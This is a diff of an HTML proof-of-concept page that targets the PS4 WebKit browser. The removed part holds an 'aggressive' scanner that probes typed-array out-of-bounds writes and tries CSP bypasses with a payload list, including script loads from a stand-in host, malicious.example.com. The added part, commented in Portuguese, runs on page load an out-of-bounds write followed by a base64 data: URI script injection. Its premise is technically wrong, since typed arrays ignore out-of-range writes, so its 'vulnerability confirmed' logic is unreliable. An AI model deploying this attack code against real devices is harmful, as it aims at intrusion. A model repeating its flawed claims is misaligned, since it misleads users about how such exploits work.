@@ -2,246 +2,58 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Vulnerability Scanner | Aggressive POC</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { background: #111; border: 1px solid #333; padding: 15px; height: 600px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
-        #browserInfo { margin-bottom: 15px; border: 1px solid #555; padding: 10px; }
-        button { background: #f44336; color: white; border: none; padding: 8px 15px; margin: 5px; border-radius: 3px; }
-        select { background: #222; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
-        .success { color: #4CAF50; }
-        .danger { color: #f44336; }
-        .warning { color: #FFC107; }
-        .info { color: #2196F3; }
-        .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
-        .poc-potential { color: #FF9800; font-weight: bold; }
-        .defense-bypass { color: #00BCD4; font-weight: bold; }
-        .privilege-escalation { color: #FF4081; font-weight: bold; }
-    </style>
+    <title>PS4 WebKit Vulnerability POC</title>
 </head>
 <body>
-    <h1>PS4 WebKit Vulnerability Scanner | Aggressive POC</h1>
+    <h1>PS4 WebKit Vulnerability POC</h1>
+    <div id="output"></div>
 
-    <div id="browserInfo">
-        <strong>User Agent:</strong> <span id="userAgent"></span><br>
-        <strong>Platform:</strong> <span id="platform"></span><br>
-    </div>
+    <script>
+        async function triggerOOBWriteAndCSPBypass() {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML += "<h2>Iniciando PoC...</h2>";
 
-    <div>
-        <select id="testSelector">
-            <option value="all_aggressive">Run All Aggressive Tests</option>
-            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
-            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts</option>
-        </select>
-        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
-        <button onclick="clearLog()">Clear Log</button>
-    </div>
-
-    <div id="log"></div>
-
-<script>
-// ======================
-// Collect Browser Information (unchanged)
-// ======================
-document.addEventListener('DOMContentLoaded', function() {
-    const userAgentElement = document.getElementById('userAgent');
-    const platformElement = document.getElementById('platform');
-
-    try {
-        if (userAgentElement) userAgentElement.textContent = navigator.userAgent;
-    } catch (e) {
-        console.error("Error getting userAgent:", e);
-        if (userAgentElement) userAgentElement.textContent = "N/A";
-    }
-    try {
-        if (platformElement) platformElement.textContent = navigator.platform;
-    } catch (e) {
-        console.error("Error getting platform:", e);
-        if (platformElement) platformElement.textContent = "N/A";
-    }
-});
-
-// ======================
-// Logging Function (unchanged)
-// ======================
-function log(message, type = '') {
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        const line = document.createElement('div');
-        line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-        if (type) {
-            line.className = type;
-        }
-        logDiv.appendChild(line);
-        logDiv.scrollTop = logDiv.scrollHeight;
-    } else {
-        console.error("Error: #log element not found!");
-    }
-}
-
-function clearLog() {
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        logDiv.innerHTML = '';
-    }
-}
-
-// ======================
-// Aggressive POC Tests
-// ======================
-const aggressiveTests = {
-    "oob_write_aggressive": async function() {
-        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write Investigation...", "info");
-        try {
-            const bufferSize = 32;
-            const buffer = new ArrayBuffer(bufferSize);
-            const view = new Uint8Array(buffer);
-            const writeValue = 0xEE;
-            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10];
-            const readOffsets = [-5, 0, 5, bufferSize - 5, bufferSize - 1, bufferSize, bufferSize + 5];
-
-            for (const writeOffset of offsets) {
-                log(`[OOB-AGG] Attempting to write 0x${writeValue.toString(16)} at offset ${writeOffset} (relative to buffer start)...`, "info");
-                try {
-                    view[writeOffset] = writeValue;
-                    log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
-                    for (const readOffset of readOffsets) {
-                        try {
-                            const readValue = view[readOffset];
-                            log(`[OOB-AGG] Read 0x${readValue.toString(16)} at offset ${readOffset} after write at ${writeOffset}.`, "info");
-                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
-                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption: Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at ${readOffset}.</span>`, "danger");
-                            } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
-                                log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption (Negative Offset): Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at ${readOffset}.</span>`, "danger");
-                            }
-                        } catch (readError) {
-                            log(`✅ Error reading at offset ${readOffset}: ${readError.message}`, "success");
-                        }
-                    }
-                } catch (writeError) {
-                    log(`✅ OOB write at offset ${writeOffset} error: ${writeError.message}`, "success");
-                }
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-
-            log("[OOB-AGG] Completed aggressive OOB write testing.", "info");
-
-        } catch (e) {
-            log(`❌ Test error: ${e.message}`, "danger");
-        }
-        return false;
-    },
-
-    "csp_bypass_aggressive": async function() {
-        log("[PRIV-ESC] Aggressive CSP Bypass Attempts...", "info");
-        const scriptSources = [
-            'data:text/javascript;base64,YWxlcnQoImNzcCBiYXlwYXNzIik7',
-            'data:application/javascript;base64,YWxlcnQoImNzcCBiYXlwYXNzIik7',
-            'ftp://malicious.example.com/script.js',
-            'http://malicious.example.com/script.js',
-            'https://malicious.example.com/script.js',
-            '//malicious.example.com/script.js',
-            'blob:null/someBlob',
-            'javascript:alert("csp bypass")',
-            'vbscript:msgbox("csp bypass")',
-        ];
-
-        for (const src of scriptSources) {
-            log(`[CSP-AGG] Attempting script injection with src: ${src}`, "info");
+            // Passo 1: Gatilho da Vulnerabilidade de OOB Write para Corromper Memória
+            outputDiv.innerHTML += "<p><strong>Passo 1: Gatilhando OOB Write...</strong></p>";
             try {
-                const script = document.createElement('script');
-                script.src = src;
-                document.body.appendChild(script);
-                script.onerror = () => {
-                    log(`⚠️ Script load error (potential CSP block) for: ${src}`, "warning");
-                    document.body.removeChild(script);
-                };
-                script.onload = () => {
-                    log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 CSP Bypass Possible: Script loaded from ${src}</span>`, "danger");
-                    document.body.removeChild(script);
-                };
-                // Small timeout to allow load attempt
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            } catch (e) {
-                log(`❌ Error injecting script with src ${src}: ${e.message}`, "danger");
-            }
+                const bufferSize = 32;
+                const buffer = new ArrayBuffer(bufferSize);
+                const view = new Uint8Array(buffer);
+                const writeOffset = 32; // Escrevendo 1 byte após o final
+                const writeValue = 0x41; // 'A'
 
-            // Attempt inline script injection via attributes
-            const elementWithEvent = document.createElement('div');
-            const eventAttributes = ['onerror', 'onload', 'onclick', 'onmouseover'];
-            for (const attr of eventAttributes) {
-                const inlineCode = 'window.aggressiveCSPBypass = true;';
-                elementWithEvent.setAttribute(attr, inlineCode);
-                document.body.appendChild(elementWithEvent);
-                // Trigger the event (some might not trigger automatically)
-                if (attr === 'onerror') {
-                    // Force an error to trigger onerror
-                    const img = document.createElement('img');
-                    img.src = 'invalid-image.jpg';
-                    img.onerror = new Function(inlineCode);
-                    document.body.appendChild(img);
-                    document.body.removeChild(img);
-                } else if (attr === 'onload' && elementWithEvent.tagName === 'img') {
-                    elementWithEvent.src = 'valid-image.png'; // Might trigger onload
-                } else if (attr === 'onclick') {
-                    // No easy way to trigger without user interaction
-                } else if (attr === 'onmouseover') {
-                    // Requires mouse interaction
+                view[writeOffset] = writeValue;
+                outputDiv.innerHTML += `<p>Tentativa de escrita de 0x${writeValue.toString(16)} no offset ${writeOffset} (fora dos limites).</p>`;
+
+                // Tentativa de leitura em um offset dentro dos limites para verificar a corrupção
+                const readOffset = 0;
+                const readValue = view[readOffset];
+                outputDiv.innerHTML += `<p>Leitura no offset ${readOffset}: 0x${readValue.toString(16)}</p>`;
+
+                if (readValue === writeValue) {
+                    outputDiv.innerHTML += "<p><strong style='color: red;'>Vulnerabilidade de OOB Write confirmada: A escrita fora dos limites afetou a memória dentro dos limites!</strong></p>";
+
+                    // Passo 2: Bypass do CSP para Executar Código Malicioso (Usando data: URI)
+                    outputDiv.innerHTML += "<p><strong>Passo 2: Tentando Bypass do CSP...</strong></p>";
+                    const script = document.createElement('script');
+                    script.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb20gT09CIFdyaXRlIScpOw=='; // alert('Vupun bypass com OOB Write!');
+                    script.onload = function() {
+                        outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass do CSP bem-sucedido usando data: URI! Código executado.</strong></p>";
+                    };
+                    script.onerror = function() {
+                        outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP usando data: URI (inesperado).</strong></p>";
+                    };
+                    document.body.appendChild(script);
+                } else {
+                    outputDiv.innerHTML += "<p>Nenhuma corrupção imediata observada no offset de leitura.</p>";
                 }
 
-                if (window.aggressiveCSPBypass === true) {
-                    log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 CSP Bypass Possible: Inline script via ${attr}</span>`, "danger");
-                    window.aggressiveCSPBypass = false; // Reset
-                }
-                document.body.removeChild(elementWithEvent);
-                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (error) {
+                outputDiv.innerHTML += `<p><strong style='color: red;'>Ocorreu um erro:</strong> ${error.message}</p>`;
             }
         }
 
-        log("[CSP-AGG] Completed aggressive CSP bypass testing.", "info");
-        return true;
-    },
-
-    "all_aggressive": async function() {
-        log("=== Running All Aggressive Tests ===", "section");
-        log("Running oob_write_aggressive...");
-        await aggressiveTests["oob_write_aggressive"]();
-        await new Promise(resolve => setTimeout(resolve, 10000));
-        log("Running csp_bypass_aggressive...");
-        await aggressiveTests["csp_bypass_aggressive"]();
-        await new Promise(resolve => setTimeout(resolve, 10000));
-        log("\n=== All Aggressive Tests Completed. Review logs and browser behavior thoroughly. ===", "section");
-    }
-};
-
-// ======================
-// Test Runner (Aggressive)
-// ======================
-async function runSelectedTest() {
-    const testSelector = document.getElementById('testSelector');
-    const selectedTest = testSelector.value;
-
-    clearLog();
-    log("=== Starting Aggressive Tests ===", "section");
-
-    if (selectedTest === "all_aggressive") {
-        await aggressiveTests["all_aggressive"]();
-    } else if (aggressiveTests[selectedTest]) {
-        await aggressiveTests[selectedTest]();
-        log(`\n=== Aggressive Test "${selectedTest}" Completed. Review logs and browser behavior closely. ===`, "section");
-    } else {
-        log(`Error: Aggressive Test "${selectedTest}" not found.`, "danger");
-    }
-
-    log("\nAggressive impact demonstration tests completed.", "info");
-}
-
-function clearLog() {
-    const logDiv = document.getElementById('log');
-    if (logDiv) {
-        logDiv.innerHTML = '';
-    }
-}
-</script>
+        document.addEventListener('DOMContentLoaded', triggerOOBWriteAndCSPBypass);
+    </script>
 </body>
 </html>
